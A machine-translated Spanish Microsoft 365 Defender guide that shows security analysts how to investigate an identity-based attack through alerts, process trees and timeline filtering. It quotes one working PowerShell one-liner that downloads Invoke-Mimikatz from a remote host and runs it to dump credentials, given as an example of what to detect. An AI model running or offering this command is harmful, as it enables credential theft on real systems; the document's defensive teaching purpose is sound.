---
title: Ejemplo de un ataque basado en identidad
description: Paso a paso por un análisis de ejemplo de un ataque basado en identidad.
keywords: incidentes, alertas, investigar, correlación, ataque, máquinas, dispositivos, usuarios, identidades, identidad, buzón, correo electrónico, 365, microsoft, m365, respuesta a incidentes, ciberataque
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 06/08/2021
ms.locfileid: "52841011"
---
# <a name="example-of-an-identity-based-attack"></a>Ejemplo de un ataque basado en identidad

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Se aplica a:**
- Microsoft 365 Defender

Microsoft Defender for Identity puede ayudar a detectar intentos malintencionados de poner en peligro las identidades de la organización. Dado que Defender for Identity se integra con Microsoft 365 Defender, los analistas de seguridad pueden tener visibilidad de las amenazas procedentes de Defender for Identity, como los intentos de elevación de privilegios de Netlogon sospechosos.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Análisis del ataque en Microsoft Defender for Identity

Microsoft 365 Defender permite a los analistas filtrar alertas por origen de detección en la **pestaña Alertas** de la página incidentes. En el siguiente ejemplo, el origen de detección se filtra a **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Ejemplo de filtrado del origen de detección de Defender for Identity":::

Al seleccionar la **alerta de ataque** sospechoso de sobrepaso de hash, se pasa a una página de Microsoft Cloud App Security que muestra información más detallada. Siempre puedes obtener más información sobre una  alerta o ataque seleccionando [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) Obtener más información sobre este tipo de alerta para leer una descripción del ataque, así como sugerencias de corrección.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Ejemplo de una alerta de ataque sospechoso de sobrepaso de hash"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Investigar el mismo ataque en Microsoft Defender para endpoint

Como alternativa, un analista puede usar Defender for Endpoint para obtener más información sobre la actividad en un punto de conexión. Seleccione el incidente en la cola de incidentes y, a continuación, seleccione la **pestaña Alertas.** Desde aquí, también pueden identificar el origen de detección. Un origen de detección etiquetado como EDR significa Detección y respuesta de puntos de conexión, que es Defender para endpoint. Desde aquí, el analista selecciona una alerta detectada por EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Ejemplo de detección y respuesta de puntos de conexión en Defender for Endpoint"::: 

La página de alertas muestra varias informaciones pertinentes, como el nombre del dispositivo afectado, el nombre de usuario, el estado de la investigación automática y los detalles de la alerta. El artículo de alerta representa una representación visual del árbol de procesos. El árbol de procesos es una representación jerárquica de los procesos primarios y secundarios relacionados con la alerta.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Ejemplo de un árbol de proceso de alerta en Defender for Endpoint"::: 

Cada proceso se puede expandir para ver detalles adicionales. Los detalles que puede ver un analista son los comandos reales que se especificaron como parte de un script malintencionado, direcciones IP de conexión salientes y otra información útil.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Ejemplo de detalles del proceso en Defender para endpoint":::
 
Al seleccionar **Ver en la escala de** tiempo, un analista puede profundizar aún más para determinar la hora exacta del compromiso. 

Microsoft Defender para endpoint puede detectar muchos archivos y scripts malintencionados. Sin embargo, debido a muchos usos legítimos para las conexiones salientes, PowerShell y la actividad de línea de comandos, algunas actividades se considerarían benignas hasta que crea un archivo o actividad malintencionados. Por lo tanto, el uso de la escala de tiempo ayuda a los analistas a poner la alerta en contexto con la actividad que lo rodea para determinar el origen o hora original del ataque que, de lo contrario, está oscurecido por la actividad común del sistema de archivos y el usuario. 

Para ello, un analista comenzaría en el momento de la detección de alertas (en rojo) y se desplazaría hacia abajo en el tiempo para determinar cuándo se inició realmente la actividad original que condujo a la actividad malintencionada. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Ejemplo de inicio en el momento de la detección de alertas"::: 

Es importante comprender y distinguir la actividad común, como las conexiones de actualización de Windows, el tráfico de activación de software de confianza Windows, otras conexiones comunes a sitios de Microsoft, actividad de Internet de terceros, actividad Microsoft Endpoint Configuration Manager y otra actividad benigna de actividad sospechosa. Una forma de lograrlo es usando filtros de escala de tiempo. Hay muchos filtros que pueden resaltar una actividad específica al filtrar todo lo que el analista no quiera ver. 

En la imagen siguiente, el analista se filtra para ver solo eventos de red y proceso. Esto permite al analista ver las conexiones de red y los procesos que rodean el evento donde Bloc de notas una conexión con una dirección IP, que también vimos en el árbol de procesos. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Ejemplo de cómo Bloc de notas se usó para realizar una conexión saliente malintencionada"::: 

En este evento en particular, Bloc de notas se usó para realizar una conexión saliente malintencionada. Sin embargo, a menudo los atacantes simplemente usan iexplorer.exe establecer conexiones para descargar una carga malintencionada, ya que normalmente iexplorer.exe procesos se consideran actividad regular del explorador web.

Otro elemento que se debe buscar en la escala de tiempo serían los usos de PowerShell para las conexiones salientes. El analista buscaría conexiones correctas de PowerShell con comandos, como una conexión saliente a un sitio `IEX (New-Object Net.Webclient)` web que hospeda un archivo malintencionado. 

En el siguiente ejemplo, PowerShell se usó para descargar y ejecutar Mimikatz desde un sitio web:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Un analista puede buscar rápidamente palabras clave escribiendo la palabra clave en la barra de búsqueda para mostrar solo los eventos creados con PowerShell. 

## <a name="next-step"></a>Paso siguiente

Consulta la ruta [de la investigación de suplantación](first-incident-path-phishing.md) de identidad.

## <a name="see-also"></a>Consulte también

- [Información general sobre incidentes](incidents-overview.md)
- [Administrar incidentes](manage-incidents.md)
- [Investigar incidentes](investigate-incidents.md)
